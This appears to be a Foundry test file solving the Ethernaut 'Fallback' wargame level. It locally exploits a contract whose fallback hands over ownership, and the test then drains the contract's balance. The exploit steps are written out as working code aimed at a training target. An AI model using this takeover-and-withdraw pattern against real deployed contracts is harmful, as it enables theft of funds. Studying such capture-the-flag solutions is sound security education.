// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/metrics/Statistics.sol";
import "../src/levels/FallbackFactory.sol";
import "../src/levels/Fallback.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    Statistics statistics;
    address eoa = address(0x1337);

    function setUp() public {
        ethernaut = new Ethernaut();

        // Statistics is actually deployed as upgradeable proxy
        // Deploying and initializing it normally for simplicity
        statistics = new Statistics();
        statistics.initialize(address(ethernaut));

        // Set Statistics contract on Ethernaut
        ethernaut.setStatistics(address(statistics));
    }

    function testFallbackHack() public {
        /* Level Setup */
        // Deploy level factory: FallbackFactory
        FallbackFactory fallbackFactory = new FallbackFactory();
        // Register level on Ethernaut
        ethernaut.registerLevel(fallbackFactory);

        // Set caller to custom address
        vm.startPrank(eoa);

        // Start recording logs to capture new level instance address
        vm.recordLogs();
        // Create new level instance via Ethernaut
        ethernaut.createLevelInstance(fallbackFactory);

        // Parse emitted logs
        Vm.Log[] memory entries = vm.getRecordedLogs();
        assertEq(
            entries[0].topics[0],
            keccak256("LevelInstanceCreatedLog(address,address,address)")
            // event LevelInstanceCreatedLog(address indexed player, address indexed instance, address indexed level);
        );
        Vm.Log memory levelFallbackCreatedLog = entries[0];

        // Cast bytes32 log arg into address
        address instanceAddress = address(
            uint160(uint256(levelFallbackCreatedLog.topics[2]))
        );
        emit log_named_address("instanceAddress", instanceAddress);

        // Instantiate level instance
        Fallback instance = Fallback(payable(instanceAddress));

        /* Level Hack */
        // 0. Check current owner
        address owner = instance.owner();
        emit log_named_address("owner", owner);
        assertEq(owner, address(fallbackFactory));

        uint256 contribution = instance.getContribution();
        assertEq(contribution, 0);

        // 1. Contribute < 0.001 ether
        vm.deal(eoa, 1 ether);
        instance.contribute{value: 0.0005 ether}();
        contribution = instance.getContribution();
        assertEq(contribution, 0.0005 ether);

        // 2. Transfer ether directly
        payable(instance).call{value: 0.1 ether}("");

        // 3. Check owner
        owner = instance.owner();
        emit log_named_address("owner", owner);
        assertEq(owner, address(eoa));

        // 4. Withdraw full balance
        uint256 balance = address(instance).balance;
        emit log_named_uint("balance", balance);

        instance.withdraw();

        balance = address(instance).balance;
        emit log_named_uint("balance", balance);
        assertEq(balance, 0);

        /* Level Submit */
        // Start recording logs to capture level completed log
        vm.recordLogs();
        ethernaut.submitLevelInstance(payable(instanceAddress));

        // Parse emitted logs
        Vm.Log[] memory submitLogsEntries = vm.getRecordedLogs();
        assertEq(
            submitLogsEntries[1].topics[0],
            keccak256("LevelCompletedLog(address,address,address)")
            // event LevelCompletedLog(address indexed player, address indexed instance, address indexed level);
        );
        Vm.Log memory levelCompletedLog = submitLogsEntries[1];

        // Cast bytes32 log arg into address
        address playerAddress_ = address(
            uint160(uint256(levelCompletedLog.topics[1]))
        );
        emit log_named_address("playerAddress_", playerAddress_);

        address instanceAddress_ = address(
            uint160(uint256(levelCompletedLog.topics[2]))
        );
        emit log_named_address("instanceAddress_", instanceAddress_);

        assertEq(playerAddress_, eoa);
        assertEq(instanceAddress_, instanceAddress);

        vm.stopPrank();
    }
}
